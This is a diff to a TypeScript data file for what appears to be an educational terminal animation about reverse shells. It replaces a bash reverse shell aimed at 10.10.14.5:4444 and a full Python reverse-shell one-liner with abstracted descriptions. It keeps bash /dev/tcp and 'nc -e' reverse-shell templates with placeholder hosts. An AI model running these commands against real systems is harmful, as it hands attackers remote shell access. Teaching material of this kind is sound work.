@@ -165,7 +165,8 @@ const stories: Record<string, Story> = {
             side: "victim",
             lines: [
               { text: "user@server:~$", type: "prompt" },
-              { text: " bash -i >& /dev/tcp/10.10.14.5/4444 0>&1", type: "command" }
+              { text: " ./malicious_script.sh", type: "command" },
+              { text: "# (payload connects back to attacker)", type: "comment", delay: 400 }
             ]
           }
         ]
@@ -197,18 +198,18 @@ const stories: Record<string, Story> = {
       },
       {
         type: "code",
-        title: "Common Reverse Shell Payloads",
+        title: "Common Reverse Shell Patterns",
         lines: [
-          { text: "# Bash", type: "comment" },
-          { text: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", type: "normal" },
+          { text: "# Bash (redirects stdin/stdout to TCP)", type: "comment" },
+          { text: "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1", type: "normal" },
           { text: "", type: "normal" },
-          { text: "# Python", type: "comment" },
-          { text: "python -c 'import socket,os,pty;s=socket.socket();", type: "normal" },
-          { text: "s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);", type: "normal" },
-          { text: "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", type: "normal" },
+          { text: "# Python (socket + pty module)", type: "comment" },
+          { text: "socket.connect() → dup2() → pty.spawn()", type: "normal" },
           { text: "", type: "normal" },
-          { text: "# Netcat", type: "comment" },
-          { text: "nc -e /bin/bash ATTACKER_IP PORT", type: "normal" }
+          { text: "# Netcat (if -e flag available)", type: "comment" },
+          { text: "nc -e /bin/sh <IP> <PORT>", type: "normal" },
+          { text: "", type: "normal" },
+          { text: "# Educational use only - see OWASP/HackTricks", type: "comment" }
         ]
       },
       {
